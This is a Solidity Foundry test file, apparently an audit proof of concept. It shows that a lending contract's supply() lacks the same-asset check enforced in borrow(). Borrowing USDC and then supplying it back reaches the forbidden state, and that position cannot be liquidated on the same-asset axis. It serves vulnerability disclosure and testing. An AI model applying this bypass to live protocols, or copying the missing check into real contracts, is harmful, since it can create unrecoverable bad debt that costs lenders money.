// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ILendingPool} from "src/interfaces/ILendingPool.sol";
import {IPriceOracle} from "src/interfaces/IPriceOracle.sol";
import {Lending} from "src/Lending/Lending.sol";
import {PriceOracle} from "src/PriceOracle.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {BaseTest} from "test/helpers/BaseTest.sol";

/// @notice Demonstrates an asymmetry in `Lending`'s same-asset-collateral-debt prevention:
///
/// `borrow()` (line 186) explicitly rejects borrowing an asset the caller has supplied:
///     if (userScaledSupply[msg.sender][asset] != 0) revert SameAssetCollateralDebtNotAllowed();
///
/// `supply()` (lines 102–128) has NO symmetric check against `userScaledBorrow`. A user can
/// reach the same forbidden state via the reverse order: borrow first, then supply the
/// borrowed asset back. The end state is identical to what the `borrow`-side guard tries
/// to prevent.
///
/// Why the prevention matters: `liquidate()` (line 268) rejects same-asset liquidation by
/// design — `if (collateralAsset == debtAsset) revert DebtAssetIsCollateralAsset();`. A
/// same-asset position therefore cannot be unwound through any on-chain liquidation
/// primitive once the user's other collateral is exhausted. The pair `(supply X, debt X)`
/// becomes a stuck residue that the protocol cannot recover via liquidation, and that
/// drifts into bad debt over time as the borrow rate exceeds the supply rate.
contract SameAssetBypassPoC is BaseTest {
    uint256 internal constant USDC_PRICE = 1e8;
    uint256 internal constant WETH_PRICE = 3_000e8;

    MockERC20 internal usdc;
    MockERC20 internal weth;
    Lending internal lending;
    PriceOracle internal oracle;

    function setUp() public override {
        super.setUp();

        usdc = deployMockToken("USDC", 6);
        weth = deployMockToken("WETH", 18);

        ILendingPool.InterestRateParams memory irParams = ILendingPool.InterestRateParams({
            baseRateRayPerYear: 0, slope1RayPerYear: 2e26, slope2RayPerYear: 8e26, optimalUtilizationBps: 8_000
        });

        vm.startPrank(owner);
        oracle = new PriceOracle();
        lending = new Lending(IPriceOracle(address(oracle)), 5_000);
        lending.listReserve(address(usdc), irParams, 8_000, 8_500, 500, 1_000, true, true);
        lending.listReserve(address(weth), irParams, 7_500, 8_000, 500, 1_000, true, true);
        oracle.setPrice(address(usdc), USDC_PRICE);
        oracle.setPrice(address(weth), WETH_PRICE);
        vm.stopPrank();

        for (uint256 i; i < 2; ++i) {
            address u = [alice, bob][i];
            mintAndApprove(usdc, u, address(lending), 10_000_000e6);
            mintAndApprove(weth, u, address(lending), 1_000 ether);
        }
    }

    /// @notice Forbidden direction: supply X then borrow X. The borrow-side guard catches it.
    function testForbiddenDirection_SupplyThenBorrowSameAsset_Reverts() public {
        vm.prank(alice);
        lending.supply(address(usdc), 1_000e6, alice);

        vm.expectRevert(ILendingPool.SameAssetCollateralDebtNotAllowed.selector);
        vm.prank(alice);
        lending.borrow(address(usdc), 100e6, alice);
    }

    /// @notice Bypass direction: borrow X then supply X. End state is identical to the
    /// forbidden direction, but the supply path has no symmetric check, so it succeeds.
    function testBypassDirection_BorrowThenSupplySameAsset_Succeeds() public {
        // Bob seeds the USDC reserve so Alice has something to borrow.
        vm.prank(bob);
        lending.supply(address(usdc), 100_000e6, bob);

        // Alice supplies WETH as collateral and borrows USDC against it.
        vm.prank(alice);
        lending.supply(address(weth), 10 ether, alice);
        vm.prank(alice);
        lending.borrow(address(usdc), 22_500e6, alice);

        // Bypass: Alice supplies the borrowed USDC back. supply() has no check against
        // userScaledBorrow[alice][USDC], so this succeeds — placing Alice in the same
        // (supply X, debt X) state that the borrow-side guard would have rejected.
        vm.prank(alice);
        lending.supply(address(usdc), 22_500e6, alice);

        (uint256 aliceUsdcSupply,) = lending.getUserReserveData(alice, address(usdc));
        (, uint256 aliceUsdcDebt) = lending.getUserReserveData(alice, address(usdc));
        assertGt(aliceUsdcSupply, 0, "alice has USDC supply");
        assertGt(aliceUsdcDebt, 0, "alice has USDC debt simultaneously");

        emit log_named_uint("Alice USDC supply (6dp)", aliceUsdcSupply);
        emit log_named_uint("Alice USDC debt   (6dp)", aliceUsdcDebt);
    }

    /// @notice Once in the same-asset state, the position is no longer recoverable via
    /// `liquidate()` along the same-asset axis. `liquidate(borrower, USDC, USDC, ...)`
    /// reverts with `DebtAssetIsCollateralAsset`. The user can only be liquidated against
    /// other-asset collateral; if they exhaust that other collateral (via WETH price
    /// drop), the same-asset residue is left behind with no recovery path.
    function testSameAssetState_LiquidateRevertsOnSameAssetAxis() public {
        // Same setup as the bypass test.
        vm.prank(bob);
        lending.supply(address(usdc), 100_000e6, bob);
        vm.prank(alice);
        lending.supply(address(weth), 10 ether, alice);
        vm.prank(alice);
        lending.borrow(address(usdc), 22_500e6, alice);
        vm.prank(alice);
        lending.supply(address(usdc), 22_500e6, alice);

        // Push Alice's HF below 1 by dropping WETH price, then attempt same-asset
        // liquidation. The liquidator is rejected at line 268, regardless of whether
        // Alice would otherwise be liquidatable.
        vm.prank(owner);
        oracle.setPrice(address(weth), 1_500e8); // 50% WETH drop

        vm.expectRevert(ILendingPool.DebtAssetIsCollateralAsset.selector);
        vm.prank(bob);
        lending.liquidate(alice, address(usdc), address(usdc), 1_000e6);
    }
}
